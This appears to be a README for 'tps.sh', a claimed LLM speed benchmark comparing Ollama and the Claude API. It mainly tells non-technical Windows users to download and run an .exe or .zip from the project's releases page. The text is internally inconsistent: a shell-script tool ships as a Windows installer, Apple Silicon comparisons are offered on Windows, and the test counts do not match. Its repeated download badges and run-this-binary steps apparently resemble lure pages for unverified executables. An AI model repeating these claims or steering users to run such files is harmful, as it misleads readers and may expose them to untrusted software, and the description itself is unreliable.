# 🛠️ tps.sh - Measure LLM Speed Easily

[![Download tps.sh](https://img.shields.io/badge/Download-tps.sh-brightgreen)](https://github.com/GabrielNetoAUT/tps.sh/releases)

---

## 📋 What is tps.sh?

tps.sh is a simple tool for testing how fast large language models (LLMs) work. It runs 147 tests using 7 different models. You can compare local models with API models. The tests focus on measuring tokens per second, which shows how many pieces of text the model can process each second.

The main comparison is between Ollama, which runs on your Apple Silicon computer, and the Claude API service, a cloud-based model. This tool helps you understand which option works best for you. tps.sh works on Apple Silicon Macs but also runs on Windows when using configured models.

You do not need programming skills to use tps.sh. This guide walks you through downloading and running it on Windows.

---

## 🔧 System Requirements

To use tps.sh on Windows, your PC should meet these basic requirements:

- Windows 10 or later
- At least 8 GB of RAM
- 2 GHz or faster processor
- 500 MB free disk space
- Internet connection for downloading and API usage
- PowerShell or Command Prompt access

If you want to compare with Apple Silicon models, you would need appropriate hardware to run Ollama locally. On Windows, the benchmarking focuses on models you can install or API-based services like Claude.

---

## 🖥️ Download tps.sh

Click the big badge above or use this link below to get tps.sh files and installer:

[Visit this page to download tps.sh](https://github.com/GabrielNetoAUT/tps.sh/releases)

This page holds several versions. Look for the latest Windows release in the list. Files usually end with `.exe` or `.zip`.

---

## ⚙️ Installing tps.sh on Windows

Follow these steps to install the software:

1. **Open your browser** and go to the releases page by clicking the download badge or link.

2. **Find the latest Windows release.** It might be named something like `tps.sh-windows.zip` or an `.exe` file.

3. **Download the file** to your preferred folder on your computer.

4. **If you downloaded a ZIP file:**

   - Right-click the file and select "Extract All..."
   - Choose a folder where you want to extract all contents.
   - Click "Extract."

5. **If you downloaded an `.exe` file:**

   - Double-click the `.exe` file.
   - Follow the installer prompts.
   - Choose the destination folder if asked.
   - Finish the installation process.

6. **Open the folder** where you extracted or installed tps.sh.

---

## 🚀 Running tps.sh for the First Time

1. Open the folder where tps.sh resides.

2. Hold **Shift** and right-click inside the folder. Choose "Open PowerShell window here" or "Open Command Prompt here."

3. In the PowerShell or Command Prompt window, type:

   ```
   tps.sh
   ```

   and press Enter.

If you get an error saying tps.sh is not recognized, try using the full filename, for example:

```
.\tps.sh.exe
```

or

```
./tps.sh.exe
```

depending on your shell.

---

## 📝 What tps.sh Does Next

After you run tps.sh:

- It will start running tests on the 7 language models.

- It uses 21 sample questions or text prompts.

- Each test measures how many tokens the model processes per second.

- Results will show as text in your PowerShell or Command Prompt window.

The software compares the speed of models running locally on your system with those running on the Claude API. You can see which performs better on your hardware and network.

---

## 🤖 Using tps.sh With Your Own Models

If you want to test different local LLMs on Windows:

- Install your model software separately.

- Make sure it can be run from the command line.

- Configure tps.sh to point to your local model's command or API.

This process usually involves editing a configuration file. A sample config is included in the download folder.

---

## 🔄 Updating tps.sh

Check the release page regularly to see if new versions are available. Download the updated files and repeat the installation steps.

Back up your custom configs before updating.

---

## 💡 Tips for Better Testing

- Close other heavy programs while running tps.sh to get accurate speed results.

- Use a stable internet connection if testing API-based models.

- Review the prompt list inside tps.sh to understand what text it tests.

---

## 🛠 Troubleshooting

- If tps.sh does not start, confirm you have the latest Windows updates.

- Ensure PowerShell or Command Prompt has permission to run scripts.

- Verify model paths or API keys in the config files.

- Visit the [GitHub issues page](https://github.com/GabrielNetoAUT/tps.sh/issues) for community help.

---

## 📚 More Information

Explore the documentation and community posts on the repository page to learn more about advanced options and integrations.

---

[![Download tps.sh](https://img.shields.io/badge/Download-tps.sh-brightgreen)](https://github.com/GabrielNetoAUT/tps.sh/releases)